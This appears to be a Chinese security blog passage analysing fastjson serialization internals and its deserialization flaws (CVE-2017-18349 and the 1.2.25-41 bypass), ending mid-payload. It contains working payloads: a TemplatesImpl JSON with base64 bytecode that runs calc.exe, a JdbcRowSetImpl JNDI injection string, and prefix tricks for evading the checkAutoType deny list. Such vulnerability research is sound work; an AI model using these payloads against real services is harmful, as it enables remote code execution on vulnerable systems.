title="@JSONField注解"></a>@JSONField注解</h2><p>可以利用该注解自定义输出，包括控制字段排序、序列化标记等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JSONField(name=&quot;AGE&quot;, serialize=true,ordinal=2)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br></pre></td></tr></table></figure><p>生成结果：</p><p><img src="/archives/1970b414/image-20250923175908257.png" alt="image-20250923175908257"></p><ul><li><strong>format</strong> 参数用于格式化 <em>date</em> 属性。</li><li>默认情况下， FastJson 库可以序列化 Java bean 实体， 但我们可以使用 <strong>serialize</strong> 指定字段不序列化。</li><li>使用 <strong>ordinal</strong> 参数指定字段的顺序</li></ul><p>作用对象：</p><ul><li>Field</li><li>Setter 和 Getter 方法</li></ul><p>注意：FastJson在进行操作时，是跟进getter和setter方法进行的，并不是根据Field进行。若属性是私有的，必须有set方法，否则无法反序列化。</p><h2 id="转化过程分析"><a href="#转化过程分析" class="headerlink" title="转化过程分析"></a>转化过程分析</h2><p>我这里用的是fastjson1.2.24的源码</p><h3 id="对象转化为json"><a href="#对象转化为json" class="headerlink" title="对象转化为json"></a>对象转化为json</h3><p>在JSON.toJSONString下断点：<br><img src="/archives/1970b414/image-20250923180544480.png" alt="image-20250923180544480"></p><p>调用了它的一个重载方法，跟进：</p><p><img src="/archives/1970b414/image-20250923180655203.png" alt="image-20250923180655203"></p><p><img src="/archives/1970b414/image-20250923180801287.png" alt="image-20250923180801287"></p><p>实例化了一个JSONSerializer对象，随后调用了它的write方法</p><p><img src="/archives/1970b414/image-20250923180929259.png" alt="image-20250923180929259"></p><p>方法中，先获取对象的Class，调用getObjectWriter方法，获取对应的序列化器，跟进：<br><img src="/archives/1970b414/image-20250924192205429.png" alt="image-20250924192205429"></p><p><img src="/archives/1970b414/image-20250924192811055.png" alt="image-20250924192811055"></p><p>方法下又会调用到SerializeConfig#getObjectWriter方法</p><p><img src="/archives/1970b414/image-20250924192434164.png" alt="image-20250924192434164"></p><p>先尝试获取writer，是一个ObjectSerializer对象。</p><p>然后对获取到要转换对象的Class进行一系列判断，大致就是先找序列化器，然后再按对象类型匹配处理</p><p><img src="/archives/1970b414/image-20250924192516425.png" alt="image-20250924192516425"></p><p><img src="/archives/1970b414/image-20250923181341563.png" alt="image-20250923181341563"></p><p>最后判断create是否为true，我们传入的时候默认为true，所以会进入if语句，跟进createJavaBeanSerializer方法：<br><img src="/archives/1970b414/image-20250923181422040.png" alt="image-20250923181422040"></p><p>先就是获取BeanInfo，其中会获取到类中定义的字段、方法、注解等元数据</p><p>调用另一个重载方法，方法下返回JavaBeanSerializer对象</p><p><img src="/archives/1970b414/image-20250923182139314.png" alt="image-20250923182139314"></p><p>回到JSONSerializer#write，获取了对应序列化器后调用write方法开始进行序列化并转化为JSON：<br><img src="/archives/1970b414/image-20250924194753637.png" alt="image-20250924194753637"></p><p><img src="/archives/1970b414/image-20250924194835163.png" alt="image-20250924194835163"></p><p>具体的流程就在ASMSerializer_1_test#write方法中，这里跟不了就不跟了</p><p>主要逻辑就是跟进getter方法获取变量的值然后按照一定规则进行字符串拼接字符串，但这个输出对象并不是String，所以toJSONString方法最后调用其toString方法返回</p><p>也就是说如果没有实现getter方法，是没有办法成功将该属性的信息也写进json中</p><h3 id="json转换为对象"><a href="#json转换为对象" class="headerlink" title="json转换为对象"></a>json转换为对象</h3><p>以parseObject其中一个重载方法为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(JSON.toJSONString(test), test.class);</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250924195707433.png" alt="image-20250924195707433"></p><p>继续跟进重载方法：</p><p><img src="/archives/1970b414/image-20250924195931096.png" alt="image-20250924195931096"></p><p><img src="/archives/1970b414/image-20250923183926153.png" alt="image-20250923183926153"></p><p>先实例化DefaultJSONParser用于解析JSON字符串，随后调用parseObject方法</p><p>跟进parseObject方法注意到下面这段代码：</p><p><img src="/archives/1970b414/image-20250923184106169.png" alt="image-20250923184106169"></p><p>config.getDeserializer方法用于获取反序列化器，这里获取到的是JavaBeanDeserializer对象，</p><p>deserialze方法实现将JSON转化成Java对象</p><p><img src="/archives/1970b414/image-20250924201405517.png" alt="image-20250924201405517"></p><p>跟进deserialze发现最后会调用FastjsonASMDeserializer_1_test#deserialze方法</p><p>其逻辑就是先解析JSON，处理<code>&#123;</code>开始的对象，最后根据字段调用setter方法为实例化的对象添加属性值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JSON字符串 </span><br><span class="line">→ 词法分析(lexer.nextToken) </span><br><span class="line">→ 识别对象开始(&#123;) </span><br><span class="line">→ 循环解析字段名和值 </span><br><span class="line">→ 根据字段名调用对应setter方法 </span><br><span class="line">→ 返回完整对象实例</span><br></pre></td></tr></table></figure><p>反序列化后接着回到JSON#parseObject方法，最后还调用<code>parser.handleResovleTask(value);</code>：</p><p><img src="/archives/1970b414/image-20250924202751195.png" alt="image-20250924202751195"></p><p>而在这个方法中，同样调用了对象的setter方法来设置字段值</p><p>那这不就奇怪了吗，明明在进行反序列化时才调用了对象的setter为实例对象添加属性值，这里又来</p><p>其实这是因为他们分工明确，比如一个循环引用的JSON：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如这样的JSON结构</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;parent&quot;</span>,</span><br><span class="line">  <span class="string">&quot;child&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;child&quot;</span>,</span><br><span class="line">    <span class="string">&quot;parent&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$&quot;</span>&#125;  <span class="comment">// 引用根对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FastjsonASMDeserializer_1_test#deserialze反序列化创建对象时遇到引用而引用的目标对象可能还未创建，所以只能<strong>处理JSON中常规字段和值</strong>，而<code>parser.handleResovleTask(value);</code>就<strong>负责引用的解析，处理引用字段</strong></p><p>也就是说在调用<code>JSON.parseObject(JSON.toJSONString(test), test.class);</code>转化过程中会调用setter方法</p><h2 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h2><p>这里分析几个重要的反序列化为Java对象的重载方法，也是解释fastjson漏洞的关键，即为什么设置@type字段值能造成远程代码执行漏洞</p><h3 id="JSON-parse-String-text"><a href="#JSON-parse-String-text" class="headerlink" title="JSON.parse(String text)"></a>JSON.parse(String text)</h3><p>JSON解析入口：</p><p><img src="/archives/1970b414/image-20250923185815304.png" alt="image-20250923185815304"></p><p>但该方法仅接受一个参数就是传入的JSON字符串。在前面我们分析JSON转化为Java对象中，在反序列化时，需要将json与相应的对象的Class进行绑定，以告诉fastjson要还原成哪个对象。</p><p>而该方法并没有进行绑定，那么这个方法是如何识别要还原成什么对象呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(test);</span><br><span class="line"><span class="type">Object</span> <span class="variable">newtest</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br></pre></td></tr></table></figure><p>跟进下代码：<br><img src="/archives/1970b414/image-20250924212130951.png" alt="image-20250924212130951"></p><p>一样先实例化DefaultJSONParser用于解析JSON字符串</p><p>随后调用DefaultJSONParser#parse方法将JSON字符串解析成Java对象，跟进一下：<br><img src="/archives/1970b414/image-20250924212839248.png" alt="image-20250924212839248"></p><p>这里解析我们传入的JSON，当匹配到左花括号时创建JSONObject实例并调用parseObject方法</p><p>跟进DefaultJSONParser#parseObject方法:<br><img src="/archives/1970b414/image-20250923190504138.png" alt="image-20250923190504138"></p><p>该方法主要用于解析JSON对象，其中包括处理不同类型的键，主要关注下面代码：</p><p><img src="/archives/1970b414/image-20250923190628352.png" alt="image-20250923190628352"></p><p><img src="/archives/1970b414/image-20250923190939868.png" alt="image-20250923190939868"></p><p>这个key即我们对象属性的键名，即当变量的键值对中，如果键为@type，那么就会通过TypeUtils.loadClass方法获取对应值的Class对象，实际还是利用Class.forName方法，fastjson就是通过这种方法确定对象类型的</p><p><img src="/archives/1970b414/image-20250924214139818.png" alt="image-20250924214139818"></p><p>随后在确定了对象类型后就会获取反序列化器再进行反序列化，后面的过程就一样的了</p><p>所以说如果我们传入JSON中含有@type，那么fastjson就会去加载这个类，随后在反序列化时会先<strong>创建实例</strong>，随后利用setter方法设置字段的值</p><p>注意<strong>如果没有@type则不会反序列化</strong></p><p>如果你想序列化的json带有@type，可以添加指定Feature</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(test, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">//&#123;&quot;@type&quot;:&quot;org.example.fastjson.Person&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;B1uel0n3&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>所以说如果想要实现触发恶意类造成代码执行，可以从两个方面入手，第一个方面就是恶意类在实例化时就能触发链子，第二方面就是在调用getter方法触发</p><h3 id="JSON-parseObject-String-text"><a href="#JSON-parseObject-String-text" class="headerlink" title="JSON.parseObject(String text)"></a>JSON.parseObject(String text)</h3><p>类似的还有一个JSON.parseObject(String text)方法，被称为基础解析入口，是parseObject的一个重载方法</p><p><img src="/archives/1970b414/image-20250923191634587.png" alt="image-20250923191634587"></p><p>调用parse方法，跟前面一样这里就是漏洞触发的原因</p><p>往下看：</p><p>因为没有绑定java对象，会通过@type来加载对象，如果没有设置@type那返回的就是JSONObject对象，如果设置了，就会往下调用JSON.toJSON方法</p><p>这里我们默认设置了**@type值<strong>，注意此时的obj是一个</strong>java对象**，跟进JSON.toJSON方法：<br><img src="/archives/1970b414/image-20250924215900772.png" alt="image-20250924215900772"></p><p>他会先判断对象的类型，然后获取序列化器，随后通过对象的getter方法获取值并转换为JSON格式存入JSONObject对象中，然后将JSONObject对象转化为JSON再调用parse方法</p><p>整体的逻辑就是在<code>JSON.parse(String text)</code>的基础上统一了输出java对象的格式为JSONObject格式</p><p>总的来说调用JSON.parseObject(String text)方法会导致@type所指定的对象的getter和setter方法都会被调用，且是先调用setter再调用getter</p><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><ul><li><p>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">test</span> <span class="variable">newtest</span> <span class="operator">=</span> JSON.parseObject(json, test.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure></li><li><p>序列化时指定Feature为SerializerFeature.WriteClassName，可输出@type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(test, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">//&#123;&quot;@type&quot;:&quot;org.example.fastjson.Person&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;B1uel0n3&quot;&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24反序列化漏洞（CVE-2017-18349）"></a>fastjson&lt;&#x3D;1.2.24反序列化漏洞（CVE-2017-18349）</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>fastjson默认使用@type指定反序列化任意类，攻击者可通过Java环境寻找构造恶意类，再通过反序列化过程中去调用其中的<code>getter/setter</code>方法，形成恶意调用链。</p><p>影响版本：fastjson&lt;&#x3D;1.2.24</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="TemplatesImpl反序列化"><a href="#TemplatesImpl反序列化" class="headerlink" title="TemplatesImpl反序列化"></a>TemplatesImpl反序列化</h2><p>前面分析转换过程时我们知道可以从两方面进行切入，一方面是在实例化时触发我们的恶意链子，另一方面是通过getter&#x2F;setter方法触发</p><p>这里很容易想到TemplatesImpl#getOutputProperties方法，我们可通过TemplatesImpl的这个getter方法来加载字节码</p><p>而要调用getter方法只能用我们的<code>JSON.parseObject(String text)</code>触发，因为<code>JSON.parse(String tesxt)</code>过程中只用了setter方，同时<code>JSON.parseObject(String text)</code>需要该对象有setter和getter方法，而TemplatesImpl并没有setter方法</p><p>这里我们可以想到<code>Feature.SupportNonPublicField</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(text,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>回顾TemplatesImpl加载恶意字节码的条件：</p><ul><li>_name不能为空</li><li>_tfactory默认为null，需要为一个TransformerFactoryImpl对象</li><li>_class为null</li><li>_bytecodes为我们的恶意字节码</li></ul><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250925162354792.png" alt="image-20250925162354792"></p><p>这有个疑问，为什么我们传入字节码为base64编码后的代码依然能够谈计算机呢？</p><p>这是因为解析JSON时调用了com.alibaba.fastjson.parser.JSONScanner#bytesValue进行base64解码，调用栈:</p><p><img src="/archives/1970b414/image-20250925162607018.png" alt="image-20250925162607018"></p><p>同样序列化时也会进行base64编码</p><p>而网上的payload并没有对_tfactory变量进行设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;</span><br></pre></td></tr></table></figure><p>这是因为如果json字符串没有对变量进行赋值，fastjson会通过变量类型，通过<strong>获取类型对象的无参构造方法进行实例化</strong>，作为默认值。</p><p>所以payload也可以是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>弊端：需要设置Feature.SupportNonPublicField</p><h2 id="JdbcRowSetImpl反序列化"><a href="#JdbcRowSetImpl反序列化" class="headerlink" title="JdbcRowSetImpl反序列化"></a>JdbcRowSetImpl反序列化</h2><p>定位到com.sun.rowset.JdbcRowSetImpl#setAutoCommit方法：<br><img src="/archives/1970b414/image-20250925170357683.png" alt="image-20250925170357683"></p><p><img src="/archives/1970b414/image-20250925170414843.png" alt="image-20250925170414843"></p><p>con默认为null调用connect方法：<br><img src="/archives/1970b414/image-20250925170504891.png" alt="image-20250925170504891"></p><p>这里不就发现了熟悉的面孔嘛</p><p>当<code>this.getDataSourceName()</code>不为null时会调用一次JNDI请求，且请求的地址就是<code>this.getDataSourceName()</code></p><p>所有我们只用控制<code>this.getDataSourceName()</code>的值那么在调用setter方法时就能触发JNDI注入</p><p>观察它的setter方法：<br><img src="/archives/1970b414/image-20250925171704500.png" alt="image-20250925171704500"></p><p>会调用父类的setter方法：<br><img src="/archives/1970b414/image-20250925171734033.png" alt="image-20250925171734033"></p><p>父类的setDataSourceName方法就是对DataSource进行赋值</p><p>所以<code>this.getDataSourceName()</code>的值是可控的，当我们传入DataSourceName值时会先调用getter方法获取恶意地址，然后调用setAutoCommit方法触发JNDI注入，POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意由于parseObject会调用所有的setter和getter方法，而setAutoCommit方法中需要给AutoCommit一个布尔值，同时注意payload的先后顺序</p><p>因为这里反序列化的逻辑是依据json的，它是不断遍历json，哪个属性在前就先调用相应的setter方法。而getter是会经过首字母排序后依次调用</p><p><img src="/archives/1970b414/image-20250925180819748.png" alt="image-20250925180819748"></p><h1 id="fastjson-1-2-25-41-反序列化漏洞"><a href="#fastjson-1-2-25-41-反序列化漏洞" class="headerlink" title="fastjson 1.2.25-41 反序列化漏洞"></a>fastjson 1.2.25-41 反序列化漏洞</h1><h2 id="改进源码分析"><a href="#改进源码分析" class="headerlink" title="改进源码分析"></a>改进源码分析</h2><p>自从fastjson 1.2.24版本以后，引入了 <code>checkAutoType 安全机制</code></p><p><img src="/archives/1970b414/image-20250925191118204.png" alt="image-20250925191118204"></p><p>可以看到在原来代码处新增了checkAutoType机制检测类型是否合法</p><p><img src="/archives/1970b414/image-20250925192322803.png" alt="image-20250925192322803"></p><p><img src="/archives/1970b414/image-20250925191452905.png" alt="image-20250925191452905"></p><p>这里先判断autoTypeSupport是否为true，同时采用了黑白名单的方式进行检测</p><p>先采用白名单检测前缀：</p><p><img src="/archives/1970b414/image-20250925192528782.png" alt="image-20250925192528782"></p><p>但白名单一开始是空的，是通过在配置中读取名为 AUTOTYPE_ACCEPT 的系统属性来赋予的</p><p>autoTypeSupport默认为false，同样可通过.properties进行设置</p><p><img src="/archives/1970b414/image-20250925192830299.png" alt="image-20250925192830299"></p><p>如果白名单检查未通过，继续检查是否在拒绝列表中</p><p>包括：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>所以如果我们需要利用这个版本的fastjson反序列化漏洞，首先需要autoTypeSuppor为true，并且需要绕过黑名单检测</p><p>这里我们跟进TypeUtils.loadClass方法看是否有改变：<br><img src="/archives/1970b414/image-20250925195030733.png" alt="image-20250925195030733"></p><p>如果@type所指定的类以<code>[</code>开头，会创建一个数组返回这个数组对应的Class对象。如果变量componentType为b1uel0n3.class，则会返回b1uel0n3[].class，即b1uel0n3数组的Class对象</p><p>如果@type所指定的类以<code>L</code>开头并且以<code>;</code>结尾，则会去掉头尾部然后加载类</p><p>而黑名单的处理逻辑是通过startWith方法，所以我们可以利用上面两种方式来绕过检测</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>先利用以<code>L</code>开头的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> 